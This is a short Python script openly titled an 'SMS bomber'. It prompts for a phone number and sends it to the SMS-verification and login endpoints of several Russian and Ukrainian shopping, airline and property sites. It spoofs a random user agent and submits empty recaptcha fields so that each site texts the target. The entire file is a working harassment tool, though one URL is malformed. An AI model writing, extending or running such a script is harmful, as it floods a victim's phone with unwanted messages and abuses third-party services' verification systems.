import requests, fake_useragent
from colorama import Fore, Back, Style


ua = fake_useragent.UserAgent().random
heder = {'user_agent' : ua}

print(Fore.RED + 'XXXXXXXXXXXXXXXXXXXX,\n MXLDARKNESS SMSBOMBER \n XXXXXXXXXXXXXXXXXXXX') 

x = input("ВВЕДИТЕ НОМЕР БЕЗ +:")

try: 
	r = requests.post('https://shop.vsk.ru/ajax/auth/postSms', data={'phone': x}, headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(")
try:
	r = requests.post('https://b.utair.ru/api/v1/login/', data ={'phone': x}, headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(")  
try:
	r = requests.post('https://mc.yandex,ru/clmap/7846577?', data ={'phone': x}, headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(")  
try:
	r = requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": x}, headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(")
try:
	r = requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode", params={"pageName": "registerPrivateUserPhoneVerificatio"},  data={"phone": x, "recaptcha": "off", "g-recaptcha-response": "",}, headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(")

